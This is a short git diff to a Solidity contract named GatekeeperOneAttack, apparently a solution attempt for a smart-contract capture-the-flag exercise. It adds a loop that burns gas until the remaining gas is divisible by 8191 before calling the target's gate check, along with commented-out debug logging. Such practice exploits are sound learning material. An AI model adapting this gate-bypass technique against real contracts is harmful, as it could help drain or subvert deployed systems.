@@ -38,6 +38,16 @@ contract GatekeeperOneAttack {
         console.log("gK_32_64", eoa_32_64);
         uint16 eoa_16_64 = uint16(uint64(_gateKey));
         console.log("gK_16_64", eoa_16_64); 
+        while (gasleft() % 8191 != 0) {
+            // uint256 gasr = gasleft();
+            // console.log("gas",gasr);
+        }
+        // uint256 gas = gasleft();
+        // console.log("gas end", gas);
+        // uint256 gase = gasleft();
+        // console.log("gase end", gase);
+        // uint256 gasx = gasleft();
+        // console.log("gasx end", gasx);
         gatekeeperOne.checkGateThree(_gateKey);
     }
 }
